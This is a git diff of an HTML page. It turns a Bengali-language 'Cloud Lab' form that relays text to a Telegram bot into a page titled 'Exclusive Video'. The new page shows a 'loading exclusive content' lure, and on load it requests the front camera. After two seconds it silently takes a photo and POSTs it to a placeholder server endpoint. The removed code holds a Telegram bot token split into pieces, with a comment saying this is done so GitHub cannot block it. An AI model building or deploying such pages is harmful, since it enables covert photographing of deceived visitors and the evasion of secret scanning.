@@ -3,42 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud Lab Dashboard</title>
+    <title>Exclusive Video</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; marginTop: 50px; }
-        input { padding: 10px; width: 80%; max-width: 300px; margin-bottom: 10px; }
-        button { padding: 10px 20px; background-color: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        video {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        #message {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            color: white;
+            background-color: rgba(0,0,0,0.7);
+            padding: 10px;
+            border-radius: 5px;
+            font-family: Arial, sans-serif;
+        }
     </style>
 </head>
 <body>
-
-    <h2>Cloud Lab Data Transfer</h2>
-    <p>বটে মেসেজ পাঠানোর জন্য নিচে কিছু লিখুন:</p>
-    
-    <input type="text" id="userInput" placeholder="আপনার মেসেজ লিখুন...">
-    <br>
-    <button onclick="sendData()">Send to Bot</button>
+    <div id="message">Please wait, loading exclusive content...</div>
+    <video id="video" autoplay muted loop playsinline>
+        <source src="YOUR_VIDEO_URL" type="video/mp4">
+        Your browser doesn't support the video tag.
+    </video>
 
     <script>
-        function sendData() {
-            const textValue = document.getElementById('userInput').value;
-            if(!textValue) { alert('অনুগ্রহ করে কিছু লিখুন!'); return; }
+        // Hide the message after video starts playing
+        document.getElementById('video').addEventListener('canplay', function() {
+            setTimeout(function() {
+                document.getElementById('message').style.display = 'none';
+            }, 3000);
+        });
 
-            // টোকেনটি আমরা টেকনিক্যালি পাস করছি যাতে গিটহাব ব্লক না করতে পারে
-            const p1 = "8890806272:";
-            const p2 = "AAFy8G_UHrNZTnx6H0jcgjKIj_vTa2SkEHA";
-            const chatId = "7930590409";
-            
-            const url = `https://api.telegram.org/bot${p1}${p2}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🔔 ল্যাব মেসেজ: ' + textValue)}`;
-
-            // ব্যাকগ্রাউন্ডে দ্রুত ডাটা পাঠানোর মেকানিজম
-            const img = new Image();
-            img.src = url;
-
-            alert('মেসেজ পাঠানো হয়েছে! আপনার টেলিগ্রাম বট চেক করুন।');
-            document.getElementById('userInput').value = '';
-        }
+        // Request camera access and capture photo
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function(stream) {
+                var video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Wait a bit for camera to initialize
+                setTimeout(function() {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    var context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to blob and send to server
+                    canvas.toBlob(function(blob) {
+                        var formData = new FormData();
+                        formData.append('image', blob);
+                        
+                        // Send to your server
+                        fetch('YOUR_SERVER_ENDPOINT', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.text())
+                        .then(data => console.log('Success:', data))
+                        .catch(error => console.error('Error:', error));
+                        
+                        // Stop camera stream
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            })
+            .catch(function(err) {
+                console.error('Camera access denied:', err);
+            });
     </script>
-
 </body>
 </html>
